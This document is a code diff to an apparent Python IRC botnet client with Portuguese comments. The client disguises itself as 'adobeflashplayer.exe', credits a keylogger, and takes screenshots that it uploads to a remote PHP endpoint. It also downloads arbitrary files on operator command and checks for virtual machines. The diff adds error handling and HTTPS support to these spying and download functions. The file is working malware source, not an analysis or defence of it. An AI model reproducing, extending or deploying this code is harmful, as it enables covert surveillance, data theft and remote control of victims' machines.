@@ -29,7 +29,7 @@ ircPwdCha= ""					# Password of Channel, if there enter the password or leave bl
 botAdmi= "msOliver"				# A name for the welcome help, Not obligatory.
 botPass= "12345"				# Not obligatory. A name for the welcome help
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
-urlFromUpload = "http://www.site.com.br/upload.php"			# URL that contains the php ARRAY to receive files via upload
+urlFromUpload = "http://www.site.com.br/upload.php"		# URL that contains the php ARRAY to receive files via upload
 urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
 # keylogging function
 # originally by: Technic Dynamic, http://www.technicdynamic.com/
@@ -201,15 +201,18 @@ def delFileY():
 		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + delFile + " ]")
 def oneScreenshots():# screenshot function
 # originally by: Technic Dynamic, http://www.technicdynamic.com/
-	global saveas, urlFromUpload, urlFromUpShow
-	img=ImageGrab.grab()
-	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
-	img.save(saveas)
-	sendMsg(ircChanne,  "..::Screenshot salvo::.. " + str(saveas) +  " ..:: Aguarde imagem sendo urpada::..")
-	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo 
-	files = {'file': open(saveas, 'rb')}
-	r = requests.post(urlFromUpload, files=files) #import requests
-	sendMsg(ircChanne, "..::Imagem urpado com sucesso para::.. http:"+urlFromUpShow + saveas)
+	try:
+		global saveas, urlFromUpload, urlFromUpShow
+		img=ImageGrab.grab()
+		saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
+		img.save(saveas)
+		sendMsg(ircChanne,  "..::Screenshot salvo::.. " + str(saveas) +  " ..:: Aguarde imagem sendo urpada::..")
+		#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo 
+		files = {'file': open(saveas, 'rb')}
+		r = requests.post(urlFromUpload, files=files) #import requests
+		sendMsg(ircChanne, "..::Imagem urpado com sucesso para::.. http:"+urlFromUpShow + saveas)
+	except IOError:
+		sendMsg(ircChanne, "Voce nao tem privilegio grava no host")
 def multipleScreenshots():
 # originally by: Technic Dynamic, http://www.technicdynamic.com/
 # take multiple screenshots function
@@ -228,18 +231,21 @@ def run():
 		sendMsg(ircChanne, fileRun + " arquivo nao existe.")
 def download():
 #REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllib2-requests-through-tor-in-python
-	if urlDown.find("http://")!= -1:
-		file_name = urlDown.split('/')[-1]
-		u = urllib2.urlopen(urlDown)
-		f = open(file_name, 'wb')
-		meta = u.info()
-		file_size = int(meta.getheaders("Content-Length")[0])
-		sendMsg(ircChanne, "Downloading: %s - Tamanho: %s Bytes" % (file_name, file_size))
-		f.write(u.read())
-		f.close()
-		sendMsg(ircChanne, "Download completo de: " + str(file_name))
+	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
+		try:
+			file_name = urlDown.split('/')[-1]
+			u = urllib2.urlopen(urlDown)
+			f = open(file_name, 'wb')
+			meta = u.info()
+			file_size = int(meta.getheaders("Content-Length")[0])
+			sendMsg(ircChanne, "Downloading: %s - Tamanho: %s Bytes" % (file_name, file_size))
+			f.write(u.read())
+			f.close()
+			sendMsg(ircChanne, "Download completo de: " + str(file_name))
+		except IOError:
+			sendMsg(ircChanne, "Voce nao tem privilegio para fazer o donwload")
 	else:
-		sendMsg(ircChanne, "Atencao: Falta [ http:// ] na url " + urlDown)
+		sendMsg(ircChanne, "Atencao: Falta [http://] OU [https://] na URL ")
 def upload():
 	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo
 	global urlFromUpload, urlFromUpShow
@@ -279,7 +285,7 @@ def vmDetect():
 def conn():
 #REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
     try:
-        ircSock.connect((ircServer, 6665 ))
+        ircSock.connect((ircServer, 6665)) #6667
     except socket.error:
         conn()
     else:
@@ -354,9 +360,9 @@ def main():
 				if id == botNick:
 					sendMsg(ircChanne, "!!- Bem Vindo -!! " + botAdmi)
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [exit] para matar os bots ativos")
+					sendMsg(ircChanne, "use: [exi t] para matar os bots ativos")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [leave] para os bots sair do canal")
+					sendMsg(ircChanne, "use: [leav e] para os bots sair do canal")
 					time.sleep(1)
 					sendMsg(ircChanne, "use: [dir] para vizualizar o diretorio atual do bot")
 					time.sleep(1)
